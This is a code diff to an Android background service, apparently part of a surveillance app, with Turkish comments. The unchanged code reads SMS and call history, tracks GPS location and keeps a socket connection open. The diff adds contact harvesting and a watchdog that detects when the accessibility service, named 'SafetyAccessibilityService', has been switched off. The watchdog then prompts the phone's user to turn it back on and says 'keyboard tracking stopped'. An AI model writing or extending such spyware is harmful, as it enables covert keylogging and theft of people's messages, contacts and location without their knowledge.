@@ -6,18 +6,32 @@ import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.media.projection.MediaProjectionManager
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
 import android.provider.Settings
 import androidx.core.app.NotificationCompat
 import android.util.Log
 
 class MainService : Service() {
 
+    private val watchdogHandler = Handler(Looper.getMainLooper())
+    private val accessibilityWatchdog = object : Runnable {
+        override fun run() {
+            if (!isAccessibilityEnabled()) {
+                Log.w("MainService", "Erişilebilirlik servisi kapalı — bildirim gönderiliyor")
+                sendAccessibilityDisabledNotification()
+            }
+            watchdogHandler.postDelayed(this, 30_000L)
+        }
+    }
+
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
         startForegroundNotification()
+        watchdogHandler.postDelayed(accessibilityWatchdog, 30_000L)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -34,6 +48,7 @@ class MainService : Service() {
         // SMS ve arama geçmişi okuyucuları — başlatılmamışsa başlat
         SmsReader.start(this)
         CallLogReader.start(this)
+        ContactsReader.start(this)
 
         // GPS sürekli konum takibi
         LocationHelper.startTracking(this)
@@ -108,11 +123,45 @@ class MainService : Service() {
         return services.contains("${packageName}/${packageName}.SafetyAccessibilityService")
     }
 
+    private fun sendAccessibilityDisabledNotification() {
+        val channelId = "acc_alert"
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val chan = NotificationChannel(
+                channelId,
+                "Erişilebilirlik Uyarısı",
+                NotificationManager.IMPORTANCE_HIGH
+            )
+            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
+                .createNotificationChannel(chan)
+        }
+        val settingsIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        }
+        val pi = PendingIntent.getActivity(
+            this, 0, settingsIntent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+        val notification = NotificationCompat.Builder(this, channelId)
+            .setSmallIcon(android.R.drawable.ic_dialog_alert)
+            .setContentTitle("Erişilebilirlik Servisi Kapatıldı")
+            .setContentText("Erişilebilirlik servisi kapatıldı, lütfen tekrar açın")
+            .setStyle(NotificationCompat.BigTextStyle()
+                .bigText("MIUI erişilebilirlik servisini kapattı. Klavye takibi durdu.\n\nBildirimi tıklayarak erişilebilirlik ayarlarına gidin ve servisi tekrar etkinleştirin."))
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setAutoCancel(true)
+            .setContentIntent(pi)
+            .build()
+        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
+            .notify(2, notification)
+    }
+
     override fun onDestroy() {
         super.onDestroy()
+        watchdogHandler.removeCallbacks(accessibilityWatchdog)
         SocketManager.disconnect()
         SmsReader.stop()
         CallLogReader.stop()
+        ContactsReader.stop()
         LocationHelper.stop()
     }
 }
